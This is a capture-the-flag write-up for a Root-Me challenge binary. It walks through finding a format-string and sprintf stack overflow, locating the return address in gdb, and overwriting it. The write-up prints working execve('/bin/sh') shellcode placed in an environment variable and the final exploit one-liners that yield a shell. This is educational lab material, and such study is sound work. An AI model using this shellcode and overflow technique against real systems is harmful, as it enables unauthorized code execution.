### S0lv3d by H4yicl3

First i download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```
I use IDA to analysis the code .
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int v4; // [sp+1Ch] [bp-418h]@1
  int username; // [sp+20h] [bp-414h]@1     
  int buf1; // [sp+2Ch] [bp-408h]@2
  int buf2; // [sp+22Ch] [bp-208h]@2               #try to overflow buf2 to control the return address
  const char *v8; // [sp+42Ch] [bp-8h]@1

  v8 = "root-me";
  printf("Username: ");
  fgets((char *)&username, 12, stdin);
  v4 = -1;
  *((_BYTE *)&username + strlen((const char *)&username) - 1) = 0;
  if ( !strcmp((const char *)&username, v8) )	 //if username not equal "root-me" excute copy buf1 and buf2 
  {
    printf("Hello %s ! How are you ?\n", &username);
  }
  else
  {
    //sprintf make u input formated data to string
    sprintf((char *)&buf1, "ERR Wrong user: %400s", &username);	//input formated data from username to buf1
    sprintf((char *)&buf2, (const char *)&buf1);   //input formated data buf1 to buf2 try overflow here
    printf("Bad username: %s\n", &username);
  }
  return 0;
}
```
How sprintf work !! see more detail here :http://www.cplusplus.com/reference/cstdio/sprintf/

every thing we need is here
>Composes a string with the same text that would be printed if format was used on printf, but instead of being printed, the content is stored as a C string in the buffer pointed by str.

so we want to overflow buf1 we need input formated data like (%s ,%d ...)
then buf2 will copy buf1 !!
so we can count and input how we can overflow the return address !!

Do you get the idea ? try understand that then go!

so we use gdb-peda to find return address
```
gdp-peda$ pdis main
0x0804849b <+7>:     sub    esp,0x430
we break heere
gdp-peda$ b *main+7
gdp-peda$ r
gdp-peda$ x/2wx $ebp
0xffffd6a8:     0x00000000      0xf7e2aaf3  <-- return address value
```
the address of 0xf7e2aaf3(Return address) is 0xffffd6ac !! you know ?
we have return address try to overflow this we my script
```python
padding = "%121d"
padding +="AAAA"

print padding
```
we overflow the return now
try to use strace to check that
```
python ch17.py |strace ./ch17
i got this
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
+++ killed by SIGSEGV (core dumped) +++
```
this mean i controled the return address !!

finally where we want to write
This progam not turn on any flag
```
gdp-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```
so we can use shellcode in stack ,under the environtment variable
and we can redirect to system("/bin/sh")
now i choose redirect to system("/bin/sh")

```
gdb-peda$ p &system
$1 = (<text variable, no debug info> *) 0xf7e51310 <system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f7184c ("/bin/sh")
gdb-peda$ 
```
so the script i make look like
```
padding ="%.121d"

system="\x10\x13\xe5\xf7"
retn_after="AAAA"
binsh="\x4c\x18\xf7\xf7"
print padding + system + retn_after + binsh
```
i try to run but it not work ? what!! 
i try to debug and i find that !! 
i change my python script look like
```
padding ="A"*121
system="\x10\x13\xe5\xf7"
retn_after="AAAA"
binsh="\x4c\x18\xf7\xf7"
print padding + system + retn_after + binsh
```
```
0xffffd610:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd620:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd630:     0x41412020      0x41414141      0x41414141      0x08048200
0xffffd640:     0xf7ffd938      0x00000000      0x000000c2      0xf7ea6376
```
the return address is 0xffffd6ac
but i just overflow 121 char "A" but i just add 12 char "A" in stack and i even can't control the return address !!
we continue
i change my our script look like
```
padding ="%121d"
system="\x10\x13\xe5\xf7"
retn_after="AAAA"
binsh="\x4c\x18\xf7\xf7"
print padding + "A"*12
```
run this
```
0xffffd680:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd690:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd6a0:     0x20202020      0x31312d20      0x41323336      0x41414141
0xffffd6b0:     0x00000000      0xffffd744      0xffffd74c      0xf7feacca
```
i got it !!
but that mean i just control 4 byte at return address !! be cause 8 byte before is (%121d) i mean ok gone !!

All we have is 4 byte !! so we just return to stack with shellcode!

use getenv function http://pastebin.com/LZM64WGL
 and  shellcode here
```
export hayicle=$(python -c 'print "\x90"*4+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
```
run this
```
./getenv hayicle ch17
hayicle will be at 0xffffd8bb
```
so we change the python script
```
(python -c 'print "%121d"+"\xbb\xd8\xff\xff"';cat)|./ch17

```
the result is
```
(python -c 'print "%121d"+"\xbb\xd8\xff\xff"';cat)|./ch17
Username: Bad username: %121d����
whoami
hayicle
```

we controled the shell !! GLHF !!
the script i run in sever
```
(python -c 'print "%121d"+"\xe6\xfd\xff\xbf"';cat)|./ch17
```
